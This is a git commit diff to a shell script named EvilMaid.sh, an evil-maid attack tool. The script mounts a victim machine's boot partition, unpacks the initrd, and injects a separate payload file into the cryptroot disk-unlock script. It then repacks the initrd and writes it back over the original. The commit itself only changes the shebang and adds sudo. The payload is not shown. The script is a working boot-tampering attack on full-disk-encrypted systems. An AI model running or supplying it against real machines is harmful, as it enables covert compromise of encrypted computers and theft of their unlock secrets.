05f5e1b20471076fd877572ffbc1a71b15f5dbc6
Diego Velásquez <diesveca@outlook.com>
2022-08-09 17:09:24 -0500

    Fix binbash

--- Evil-Maid/EvilMaid.sh
+++ Evil-Maid/EvilMaid.sh
@@ -1,8 +1,8 @@
-#!/usr/bin/env bash
+#!/bin/bash
 wdir=$(pwd)
 sudo apt install dracut-core -y
 mkdir ~/target
-mount -t ext4 /dev/sda1 ~/target
+sudo mount -t ext4 /dev/sda1 ~/target
 initrd=$(ls ~/target | grep initrd.img)
 mkdir ~/out
 cd ~/out
@@ -12,7 +12,8 @@ head -n -2 cryptroot > cryptroot2 && cat $wdir/payload.txt >> cryptroot2
 mv cryptroot2 cryptroot
 cd ~/out
 find . | cpio -H newc -o | gzip -9 > ~/$initrd
-mv ~/$initrd ~/target/$initrd
-umount ~/target
+sudo mv ~/$initrd ~/target/$initrd
+sudo umount ~/target
 echo "Evil Maid Completed"
 exit 0
+
